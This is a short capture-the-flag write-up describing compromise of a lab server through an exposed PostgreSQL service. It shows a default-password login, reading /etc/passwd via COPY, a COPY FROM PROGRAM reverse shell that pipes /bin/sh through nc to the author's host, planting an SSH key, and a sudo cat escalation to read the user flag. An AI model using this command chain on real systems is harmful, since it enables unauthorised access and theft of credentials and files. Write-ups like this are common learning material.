# Haxquash

Crated the resource and got an IP number

> IP: 52.214.141.72

## nmap

Did a nmap scan on the server and identifed open ports

```
22 tcp ssh
80 tcp http
5432 tcp postgresql
```


Connect to server with postgres tool

```
local$ psql -h 52.214.141.72 -U postgres
```

Connected to postgres, testing default username/password = postgres.
Surprisingly that worked.

## Running SQL commands

Tried first to see what files was available 


```
select pg_ls_dir('./');
```

Listing some none-important files
Tried to list files in "/" but was denied access. Only current directory. Tried some path traversal to no luck.


Tried to read files

```
CREATE TABLE test(output text);
COPY test from '/etc/passwd'
SELECT * from test
```

Successfull, we now had a list of accounts and home folders.

Tried to write files to www folder, maybe we could insert some server side code.

```
copy (select convert_from(decode('PEhUTUw+CkRyYWdvbnoKPC9IVE1MPg==','base64'),'utf-8')) to '/var/www/html/index2.html’;
```
Unsuccessful, since user Postgres didnt have access there. We could write files to local folder and /tmp. But that wasnt very useful.

It was about time to try reverse-shell.
Created local listener on a public endpoint

```
$nc -lvn -p 4444
```

Then told Postgres to connect
```
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 85.166.nnn.nnn 4444 >/tmp/f';
```

Success!!

## Getting SSH access

The trick is to create a new folder ~/.ssh and add a new file «authorized_keys» with the content of your own id_rsa.pub from your local ~/.ssh/id_rsa.pub

```
local$ ssh postgres@52.214.141.72
```


And we logged in with no password, just using your private key


## user.txt

After getting a tty (using ssh) we can now do a *sudo*.

To list potential sudo commands to run we run 'sudo -l'

```
postgres@ip-10-0-0-164:~$ sudo -l

Matching Defaults entries for postgres on ip-10-0-0-164:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User postgres may run the following commands on ip-10-0-0-164:
    (helix) NOPASSWD: /bin/cat

```

Taking a wild guess that the user.txt lives in helix home directory

```
sudo -u helix cat /home/helix/user.txt
```

Ad there was the user flag.

It was now 17:50, so there was no more time trying to root the server.

